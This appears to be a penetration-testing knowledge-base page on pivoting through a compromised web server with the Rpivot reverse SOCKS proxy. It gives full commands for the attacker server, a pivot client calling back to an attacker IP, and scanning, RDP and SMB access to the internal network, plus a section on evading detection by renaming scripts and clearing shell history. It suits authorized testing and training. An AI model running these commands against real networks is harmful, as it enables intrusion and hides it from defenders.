# Web Server Pivoting with Rpivot

**Back to:** [[Pivoting, Tunneling and Port Forwarding|Pivoting Index]]
**Related:** [[SOCKS5 Tunneling with Chisel|Chisel]], [[SSH Socks Tunnel PF|SSH SOCKS Tunnel]], [[DNS Tunnelling with Dnscat2|DNS Tunneling]]

---

## Overview

Rpivot is a Python-based reverse SOCKS proxy tool that enables pivoting from compromised web servers or internal machines back to an attacker's system. Ideal when you have command execution on a web server but limited network access.

**Key Features:**
- Reverse SOCKS proxy
- Python-based (portable)
- HTTP/HTTPS tunneling
- NTLM proxy support
- Simple setup

**Use Cases:**
- Compromised web server as pivot
- Only HTTP/HTTPS egress allowed
- Can't use SSH (not installed/blocked)
- Web shell access to internal network
- NTLM proxy bypass needed

**Advantages:**
- Works over HTTP
- Reverse connection (firewall friendly)
- No SSH required
- Supports NTLM authentication
- Python 2.7 compatible

---

## Network Topology

```
Attack Machine ← Rpivot Server ← HTTP/Reverse ← Rpivot Client (Pivot) → Internal Network
(10.10.14.18:9050)   Listener       Connection    (172.16.5.129)         (172.16.5.0/24)
```

### Environment Details

| Component | IP Address | Description |
|-----------|------------|-------------|
| Attack Machine | 10.10.14.18:9050 | Runs rpivot server |
| Pivot Host | 10.129.15.50 / 172.16.5.129 | Compromised Ubuntu web server |
| Internal Target | 172.16.5.135:80 | Internal web application |

---

## Installation

### Attack Machine Setup

#### Clone Rpivot
```bash
# Clone repository
git clone https://github.com/klsecservices/rpivot.git
cd rpivot
```

#### Install Python 2.7

**Method 1: APT (Debian/Ubuntu)**
```bash
sudo apt-get update
sudo apt-get install python2.7
```

**Method 2: Pyenv (Recommended)**
```bash
# Install pyenv
curl https://pyenv.run | bash

# Add to ~/.bashrc
echo 'export PYENV_ROOT="$HOME/.pyenv"' >> ~/.bashrc
echo 'command -v pyenv >/dev/null || export PATH="$PYENV_ROOT/bin:$PATH"' >> ~/.bashrc
echo 'eval "$(pyenv init -)"' >> ~/.bashrc
source ~/.bashrc

# Install Python 2.7
pyenv install 2.7.18
pyenv shell 2.7.18

# Verify
python --version
# Python 2.7.18
```

---

## Setup and Usage

### Step 1: Start Rpivot Server (Attack Machine)

```bash
# Navigate to rpivot directory
cd rpivot

# Start server
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```

**Parameters:**
- `--proxy-port 9050`: Local SOCKS proxy port
- `--server-port 9999`: Port to listen for reverse connections
- `--server-ip 0.0.0.0`: Listen on all interfaces

**Output:**
```
Listening for connections on 0.0.0.0:9999
SOCKS proxy listening on 127.0.0.1:9050
```

---

### Step 2: Transfer Rpivot to Pivot Host

```bash
# Via SCP
scp -r rpivot ubuntu@10.129.15.50:/home/ubuntu/

# Via HTTP (if web shell available)
# On attack machine:
python3 -m http.server 8000

# On pivot:
wget http://10.10.14.18:8000/rpivot.tar.gz
tar xvf rpivot.tar.gz
cd rpivot
```

---

### Step 3: Run Rpivot Client on Pivot

```bash
# On pivot host
python2.7 client.py --server-ip 10.10.14.18 --server-port 9999
```

**Parameters:**
- `--server-ip`: Attack machine IP
- `--server-port`: Server listening port (9999)

**Output on Server:**
```
New connection from host 10.129.202.64, source port 35226
```

---

### Step 4: Configure Proxychains

```bash
# Edit /etc/proxychains.conf on attack machine
tail -2 /etc/proxychains.conf

# Add or verify:
socks4 127.0.0.1 9050
```

---

### Step 5: Access Internal Network

```bash
# Web browsing
proxychains firefox 172.16.5.135:80

# Port scanning
proxychains nmap -sT -Pn 172.16.5.135

# RDP connection
proxychains xfreerdp /v:172.16.5.19 /u:admin /p:pass

# SMB enumeration
proxychains smbclient -L //172.16.5.20
```

---

## Advanced Usage

### NTLM Proxy Support

When pivot is behind NTLM-authenticated proxy:

```bash
# On pivot host
python2.7 client.py \
  --server-ip 10.10.14.18 \
  --server-port 9999 \
  --ntlm-proxy-ip 172.16.5.100 \
  --ntlm-proxy-port 8080 \
  --domain CORP \
  --username john.doe \
  --password P@ssw0rd
```

**Parameters:**
- `--ntlm-proxy-ip`: Corporate proxy IP
- `--ntlm-proxy-port`: Proxy port
- `--domain`: Windows domain
- `--username`: Domain username
- `--password`: User password

---

### Custom Port Configuration

```bash
# Server with custom ports
python2.7 server.py --proxy-port 1080 --server-port 443 --server-ip 0.0.0.0

# Update proxychains
socks4 127.0.0.1 1080

# Client connects to port 443 (looks like HTTPS)
python2.7 client.py --server-ip 10.10.14.18 --server-port 443
```

---

### SSL/TLS Encryption

```bash
# Generate certificate
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes

# Server with SSL
python2.7 server.py --proxy-port 9050 --server-port 443 --server-ip 0.0.0.0 --ssl --cert cert.pem --key key.pem

# Client with SSL
python2.7 client.py --server-ip 10.10.14.18 --server-port 443 --ssl
```

---

## Troubleshooting

### Connection Fails

```bash
# Verify server is listening
netstat -tulpn | grep 9999

# Test connectivity from pivot
nc -zv 10.10.14.18 9999

# Check firewall on attack machine
sudo iptables -L -n | grep 9999
```

### Python Version Issues

```bash
# Verify Python 2.7
python2.7 --version

# Install python2.7 if missing
sudo apt-get install python2.7

# Check dependencies
python2.7 -c "import socket; print('OK')"
```

### SOCKS Proxy Not Working

```bash
# Verify proxy is running
netstat -tulpn | grep 9050

# Test with curl
curl --socks4 127.0.0.1:9050 http://172.16.5.135

# Check proxychains config
cat /etc/proxychains.conf | grep socks4
```

### Slow Performance

```bash
# Increase buffer sizes (edit rpivot source)
# Or use compression at network level

# Alternative: Use Chisel for better performance
```

---

## Comparison with Other HTTP Tunneling Tools

| Feature | Rpivot | [[SOCKS5 Tunneling with Chisel\|Chisel]] | [[DNS Tunnelling with Dnscat2\|Dnscat2]] |
|---------|--------|---------|----------|
| Protocol | HTTP | HTTP/SSH | DNS |
| Speed | Medium | Fast | Slow |
| Encryption | Optional | Yes | Yes |
| Setup | Medium | Easy | Medium |
| Python Required | Yes (2.7) | No | No |
| Reverse Mode | Yes | Yes | Yes |

**Use Rpivot When:**
- Have Python 2.7 on pivot
- Need NTLM proxy support
- HTTP/HTTPS only egress
- Web server compromise scenario

**Use Alternatives:**
- [[SOCKS5 Tunneling with Chisel|Chisel]]: Want better performance, modern tool
- [[SSH Socks Tunnel PF|SSH]]: SSH available, want best performance
- [[DNS Tunnelling with Dnscat2|Dnscat2]]: Only DNS allowed

---

## Operational Security

### Detection Indicators
- Python process with network connections
- Unusual HTTP traffic patterns
- Long-lived HTTP connections
- Rpivot in process command line
- Python 2.7 installation on web server

### Evasion Techniques

```bash
# Rename scripts
mv client.py update.py
mv server.py listener.py

# Use common ports
python2.7 server.py --server-port 443 --proxy-port 9050

# SSL encryption
python2.7 server.py --ssl --server-port 443

# Clean up after
rm -rf rpivot/
history -c
```

---

## Alternative: Web Shell with Built-in Proxy

If rpivot is detected, consider:

### PHP Web Shell with SOCKS
```php
<?php
// Minimal PHP SOCKS proxy (proof of concept)
// Production use: reGeorg, Neo-reGeorg
?>
```

### Tools Like reGeorg
```bash
# Modern alternative to rpivot
git clone https://github.com/sensepost/reGeorg
python reGeorgSocksProxy.py -p 9050 -u http://target/tunnel.php
```

---

## Quick Reference

```bash
# Server setup (attack machine)
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0

# Client setup (pivot host)
python2.7 client.py --server-ip ATTACKER_IP --server-port 9999

# With NTLM proxy
python2.7 client.py --server-ip ATTACKER_IP --server-port 9999 \
  --ntlm-proxy-ip PROXY_IP --ntlm-proxy-port 8080 \
  --domain DOMAIN --username USER --password PASS

# Proxychains config
echo "socks4 127.0.0.1 9050" >> /etc/proxychains.conf

# Use with tools
proxychains nmap -sT -Pn TARGET
proxychains firefox TARGET

# Install Python 2.7 (pyenv)
pyenv install 2.7.18
pyenv shell 2.7.18

# Transfer to pivot
scp -r rpivot user@pivot:/tmp/
```

---

**See Also:**
- [[Pivoting, Tunneling and Port Forwarding|Main Pivoting Index]]
- [[SOCKS5 Tunneling with Chisel|Chisel HTTP Tunneling]]
- [[SSH Socks Tunnel PF|SSH SOCKS Tunnel]]
- [[DNS Tunnelling with Dnscat2|DNS Covert Channel]]

**Tags:** #rpivot #http-tunnel #reverse-socks #python #web-server-pivot #ntlm-proxy